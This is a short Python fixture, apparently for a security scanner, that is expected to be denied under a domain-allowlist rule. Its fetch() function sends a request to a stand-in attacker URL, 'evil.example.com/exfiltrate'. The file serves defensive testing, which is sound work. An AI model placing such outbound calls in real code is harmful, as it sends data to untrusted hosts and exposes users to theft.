"""Non-allowlist network sample.

Expected scan result: decision=deny, rule_ids contains NET001_DOMAIN_NOT_ALLOWED.
"""

from __future__ import annotations

import requests


def fetch() -> dict:
    response = requests.get("https://evil.example.com/exfiltrate", timeout=5)
    return response.json()


if __name__ == "__main__":
    print(fetch())
